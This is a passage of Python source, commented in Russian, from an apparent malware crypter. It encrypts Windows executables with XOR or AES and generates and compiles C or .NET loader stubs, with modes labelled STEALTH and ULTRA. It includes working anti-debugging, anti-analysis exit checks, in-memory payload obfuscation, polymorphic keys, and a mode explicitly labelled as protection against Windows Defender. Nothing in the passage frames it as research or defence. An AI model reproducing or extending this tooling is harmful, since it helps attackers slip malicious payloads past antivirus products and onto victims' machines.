       !CheckFileCount()) {
        
        // Если обнаружен анализ - выходим незаметно
        ExitProcess(0);
    }
    
    // Дополнительная задержка
    Sleep(rand() % 3000 + 1000);
}

// Скрытие в памяти с обфускацией
void HideInMemory(unsigned char* data, int size) {
    DWORD oldProtect;
    
    // Меняем защиту памяти
    VirtualProtect(data, size, PAGE_READWRITE, &oldProtect);
    
    // Обфусцируем данные в памяти
    for(int i = 0; i < size; i++) {
        data[i] ^= 0xAA;
    }
    
    // Восстанавливаем защиту
    VirtualProtect(data, size, oldProtect, &oldProtect);
}
"""
                template_code = ultra_code + template_code
            
            # Подставляем параметры
            custom_code = template_code.replace(
                "unsigned char ENCRYPTION_KEY[32] = { /* ... */ };",
                f"unsigned char ENCRYPTION_KEY[32] = {{{', '.join(str(b) for b in aes_key)}}};"
            ).replace(
                "unsigned char PAYLOAD[] = { /* ... */ };",
                f"unsigned char PAYLOAD[] = {{{', '.join(str(b) for b in payload)}}};"
            ).replace(
                "unsigned int PAYLOAD_SIZE = 0;",
                f"unsigned int PAYLOAD_SIZE = {len(payload)};"
            )
            
            # Добавляем вызовы защиты в зависимости от режима
            if stub_mode == "STEALTH":
                custom_code = custom_code.replace(
                    "int main() {",
                    """int main() {
    // STEALTH MODE: Проверки
    if(IsDebuggerPresent()) {
        ExitProcess(0);
    }
    // Полиморфный ключ
    unsigned char poly_key[32];
    generate_polymorphic_key(ENCRYPTION_KEY, (int)time(NULL));
"""
                )
            elif stub_mode == "ULTRA":
                custom_code = custom_code.replace(
                    "int main() {",
                    """int main() {
    // ULTRA MODE: Полная защита от Defender
    anti_analysis();
    
    // Полиморфное дешифрование
    PolymorphicDecrypt(PAYLOAD, PAYLOAD_SIZE, ENCRYPTION_KEY);
    
    // Скрытие в памяти
    HideInMemory(PAYLOAD, PAYLOAD_SIZE);
"""
                )
            
            # Применяем дополнительную обфускацию для ULTRA режима
            if stub_mode == "ULTRA" and use_advanced_obfuscation:
                try:
                    custom_code = generate_obfuscated_stub(custom_code)
                    print("[DEBUG] Применена продвинутая обфускация для ULTRA режима")
                except Exception as e:
                    print(f"[DEBUG] Ошибка применения обфускации: {e}")
            
            # Сохраняем кастомный код
            custom_source = output_file.with_suffix('.c')
            with open(custom_source, 'w', encoding='utf-8') as f:
                f.write(custom_code)
            
            # Компилируем
            if arch == "x86":
                compiler_cmd = [
                    'C:\\mingw32\\bin\\gcc.exe',
                    str(custom_source),
                    '-o', str(output_file.with_suffix('.exe')),
                    '-O2',
                    '-s',
                    '-IC:\\mingw32\\include',
                    '-LC:\\mingw32\\lib',
                    '-lmingw32',
                    '-luser32',
                    '-lkernel32',
                    '-lntdll',
                    '-lpsapi',
                    '-lwtsapi32',
                    '-ladvapi32',
                    '-lgdi32',
                    '-lws2_32',
                    '-lwsock32',
                    '-mwindows'
                ]
            else:
                compiler_cmd = [
                    'C:\\mingw64\\bin\\gcc.exe',
                    str(custom_source),
                    '-o', str(output_file.with_suffix('.exe')),
                    '-O2',
                    '-s',
                    '-IC:\\mingw64\\include',
                    '-LC:\\mingw64\\lib',
                    '-lmingw32',
                    '-luser32',
                    '-lgdi32',
                    '-lws2_32',
                    '-lwsock32',
                    '-mwindows'
                ]
            
            result = subprocess.run(compiler_cmd, capture_output=True, text=True)
            if result.returncode != 0:
                print(f"Ошибка компиляции: {result.stderr}")
                return None
                
            return output_file.with_suffix('.exe')
            
        except Exception as e:
            print(f"Ошибка сборки лоадера: {e}")
            return None

    def _random_id(self, length=8):
        """Генерация уникального идентификатора"""
        return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

    def encrypt_and_build(self, file_path: str, options: Dict = None) -> dict:
        """Шифрование и сборка с поддержкой разных режимов стаба"""
        if options is None:
            options = {"stub_mode": "DEFAULT"}
        
        # Логируем полученные настройки
        print(f"[DEBUG] Получены настройки: {options}")
        print(f"[DEBUG] Режим стаба: {options.get('stub_mode', 'DEFAULT')}")
        print(f"[DEBUG] Обфускация: {options.get('obfuscation_level', 'MAXIMUM')}")
        print(f"[DEBUG] Шифрование строк: {options.get('string_encryption', False)}")
        print(f"[DEBUG] Анти-VM: {options.get('anti_vm', False)}")
        print(f"[DEBUG] Полиморфизм: {options.get('polymorphic', False)}")
            
        file_path = Path(file_path)
        with open(file_path, "rb") as f:
            original_data = f.read()

        pe = None
        try:
            pe = pefile.PE(data=original_data)
        except Exception as e:
            import traceback
            print(f"[DEBUG] Ошибка парсинга PE файла: {e}")
            print(f"[DEBUG] Полная трассировка: {traceback.format_exc()}")
            return {
                "success": False,
                "error": f"Ошибка парсинга PE файла: {e}",
                "payload_size": len(original_data),
                "arch": "x86",
                "is_dotnet": False,
                "stub_mode": options.get("stub_mode", "DEFAULT")
            }
        
        # Улучшенный способ определения .NET-файла
        is_dotnet = False
        
        # Проверяем наличие CLR заголовка
        if hasattr(pe, 'DIRECTORY_ENTRY_COM_DESCRIPTOR'):
            is_dotnet = True
            print(f"[DEBUG] Файл определен как .NET (CLR заголовок найден)")
        else:
            # Дополнительная проверка через импорты
            try:
                if hasattr(pe, 'DIRECTORY_ENTRY_IMPORT'):
                    for entry in pe.DIRECTORY_ENTRY_IMPORT:
                        if b"mscoree.dll" in entry.dll.lower():
                            is_dotnet = True
                            print(f"[DEBUG] Файл определен как .NET (mscoree.dll найден)")
                            break
            except:
                pass
            
            # Проверяем характеристики файла
            if not is_dotnet:
                # Проверяем, есть ли .NET характеристики в PE заголовке
                try:
                    if hasattr(pe, 'OPTIONAL_HEADER') and pe.OPTIONAL_HEADER:
                        if hasattr(pe.OPTIONAL_HEADER, 'DllCharacteristics'):
                            if pe.OPTIONAL_HEADER.DllCharacteristics & 0x2000:  # IMAGE_DLLCHARACTERISTICS_FORCE_INTEGRITY
                                # Дополнительная проверка для .NET
                                if hasattr(pe, 'DIRECTORY_ENTRY_DEBUG'):
                                    for debug_entry in pe.DIRECTORY_ENTRY_DEBUG:
                                        if debug_entry.struct.Type == 2:  # IMAGE_DEBUG_TYPE_CODEVIEW
                                            is_dotnet = True
                                            print(f"[DEBUG] Файл определен как .NET (debug характеристики)")
                                            break
                except:
                    pass
                    
            if not is_dotnet:
                print(f"[DEBUG] Файл определен как нативный PE")
        
        # Определяем архитектуру
        arch = "x86"  # По умолчанию
        try:
            if hasattr(pe, 'FILE_HEADER') and pe.FILE_HEADER:
                if hasattr(pe.FILE_HEADER, 'Machine'):
                    if pe.FILE_HEADER.Machine == 0x8664:
                        arch = "x64"
                    else:
                        arch = "x86"
        except:
            pass
            
        print(f"[DEBUG] Архитектура: {arch}, .NET: {is_dotnet}")

        stub_mode = options.get("stub_mode", "DEFAULT")
        
        # Выбираем алгоритм шифрования в зависимости от режима
        if stub_mode == "DEFAULT" or (stub_mode == "ULTRA" and is_dotnet):
            # Простое XOR шифрование (для DEFAULT или .NET файлов в ULTRA режиме)
            xor_key = get_random_bytes(32)
            encrypted_payload = bytearray(len(original_data))
            for i in range(len(original_data)):
                encrypted_payload[i] = original_data[i] ^ xor_key[i % 32]
            encrypted_payload = bytes(encrypted_payload)
            
        elif stub_mode == "STEALTH":
            # Полиморфное XOR с анти-отладкой
            xor_key = self._generate_polymorphic_key(32, int(time.time()))
            encrypted_payload = bytearray(len(original_data))
            for i in range(len(original_data)):
                encrypted_payload[i] = original_data[i] ^ xor_key[i % 32]
            encrypted_payload = bytes(encrypted_payload)
            
        elif stub_mode == "ULTRA" and not is_dotnet:
            # AES-256 + XOR комбинированное шифрование (только для Native файлов)
            if CRYPTO_AVAILABLE:
                aes_key = get_random_bytes(32)
                xor_key = get_random_bytes(32)
                
                # Сначала XOR
                temp_data = bytearray(len(original_data))
                for i in range(len(original_data)):
                    temp_data[i] = original_data[i] ^ xor_key[i % 32]
                
                # Потом AES
                cipher = AES.new(aes_key, AES.MODE_GCM)
                ciphertext, tag = cipher.encrypt_and_digest(bytes(temp_data))
                encrypted_payload = cipher.nonce + tag + ciphertext
            else:
                # Fallback к XOR если AES недоступен
                xor_key = get_random_bytes(32)
                encrypted_payload = bytearray(len(original_data))
                for i in range(len(original_data)):
                    encrypted_payload[i] = original_data[i] ^ xor_key[i % 32]
                encrypted_payload = bytes(encrypted_payload)
        else:
            # DEFAULT fallback
            xor_key = get_random_bytes(32)
            encrypted_payload = bytearray(len(original_data))
            for i in range(len(original_data)):
                encrypted_payload[i] = original_data[i] ^ xor_key[i % 32]
            encrypted_payload = bytes(encrypted_payload)

        # Создаем лоадер в зависимости от типа файла и режима
        loader_exe_path = None
        try:
            if is_dotnet:
                # Для .NET файлов используем .NET loader
                print(f"[DEBUG] Создаю .NET loader для {arch} архитектуры")
                print(f"[DEBUG] Размер зашифрованного payload: {len(encrypted_payload)} байт")
                print(f"[DEBUG] Применяю настройки обфускации для .NET: {options}")
                
                # Применяем настройки обфускации из GUI для .NET
                if options.get('string_encryption', False):
                    print(f"[DEBUG] .NET: Применяю шифрование строк")
                if options.get('import_obfuscation', False):
                    print(f"[DEBUG] .NET: Применяю обфускацию импортов")
                if options.get('junk_code_injection', False):
                    print(f"[DEBUG] .NET: Применяю инжекцию мусорного кода")
                if options.get('anti_vm', False):
                    print(f"[DEBUG] .NET: Применяю анти-VM защиту")
                if options.get('polymorphic', False):
                    print(f"[DEBUG] .NET: Применяю полиморфизм")
                
                import sys
                sys.path.append(str(Path(__file__).parent))
                from build_loader import build_dotnet_loader
                print(f"[DEBUG] Вызываю build_dotnet_loader...")
                loader_exe_path = build_dotnet_loader(xor_key, encrypted_payload, 
                                                     Path(__file__).parent / "dotnet_loader_custom")
                print(f"[DEBUG] build_dotnet_loader вернул: {loader_exe_path}")
            else:
                # Для обычных PE используем native loader с настройками обфускации
                print(f"[DEBUG] Создаю native loader для {arch} архитектуры, режим: {stub_mode}")
                print(f"[DEBUG] Настройки обфускации: {options}")
                
                # Применяем настройки обфускации из GUI для Native
                if options.get('string_encryption', False):
                    print(f"[DEBUG] Native: Применяю шифрование строк")
                if options.get('import_obfuscation', False):
                    print(f"[DEBUG] Native: Применяю обфускацию импортов")
                if options.get('junk_code_injection', False):
                    print(f"[DEBUG] Native: Применяю инжекцию мусорного кода")
                if options.get('anti_vm', False):
                    print(f"[DEBUG] Native: Применяю анти-VM защиту")
                if options.get('polymorphic', False):
                    print(f"[DEBUG] Native: Применяю полиморфизм")
                
                loader_exe_path = self.build_custom_loader(xor_key, encrypted_payload, arch, stub_mode, options)
        except Exception as e:
            print(f"Ошибка сборки loader: {e}")
            print("💡 Установите компиляторы:")
            print("   - Для .NET: .NET SDK (уже установлен)")
            print("   - Для C/C++: MinGW-w64 или Visual Studio Build Tools")
            return {
                "success": False,
                "error": f"Ошибка сборки loader: {e}",
                "payload_size": len(original_data),
                "arch": arch,
                "is_dotnet": is_dotnet,
                "stub_mode": stub_mode
            }

        # Определяем путь для конечного файла
        output_path = file_path.parent / (file_path.stem + f"_crypted_{stub_mode.lower()}" + file_path.suffix)
        
        # Копируем скомпилированный лоадер в конечный файл
        if loader_exe_path and Path(loader_exe_path).exists():
            print(f"[DEBUG] Копирую {loader_exe_path} в {output_path}")
            
            # Проверяем размер исходного файла
            loader_size = Path(loader_exe_path).stat().st_size
            print(f"[DEBUG] Размер loader'а: {loader_size} байт")
            
            # Копируем файл
            shutil.copy(loader_exe_path, output_path)
            
            # Проверяем размер скопированного файла
            copied_size = Path(output_path).stat().st_size
            print(f"[DEBUG] Размер скопированного файла: {copied_size} байт")
            
            # Проверяем, что файл валидный PE
            try:
                pe_check = pefile.PE(str(output_path))
                print(f"[DEBUG] Файл является валидным PE")
                
                # Безопасная проверка архитектуры
                try:
                    if hasattr(pe_check, 'FILE_HEADER') and pe_check.FILE_HEADER:
                        if hasattr(pe_check.FILE_HEADER, 'Machine'):
                            arch_check = 'x64' if pe_check.FILE_HEADER.Machine == 0x8664 else 'x86'
                            print(f"[DEBUG] Архитектура PE: {arch_check}")
                except:
                    print(f"[DEBUG] Не удалось определить архитектуру PE")
                
                # Проверяем, что это .NET файл
                if hasattr(pe_check, 'DIRECTORY_ENTRY_COM_DESCRIPTOR'):
                    print(f"[DEBUG] Файл является .NET сборкой")
                else:
                    print(f"[DEBUG] Файл НЕ является .NET сборкой")
                    
            except Exception as e:
                print(f"[DEBUG] Ошибка проверки PE: {e}")
            
            return {
                "success": True,
                "output_file": output_path,
                "payload_size": len(original_data),
                "aes_key": xor_key.hex(),  # Для совместимости
                "loader_exe": loader_exe_path,
                "arch": arch,
                "is_dotnet": is_dotnet,
                "stub_mode": stub_mode
            }
        else:
            print(f"[DEBUG] Loader не найден: {loader_exe_path}")
            return {
                "success": False,
                "error": "Ошибка создания loader - скомпилированный файл не найден",
                "payload_size": len(original_data),
                "arch": arch,
                "is_dotnet": is_dotnet,
                "stub_mode": stub_mode
            } 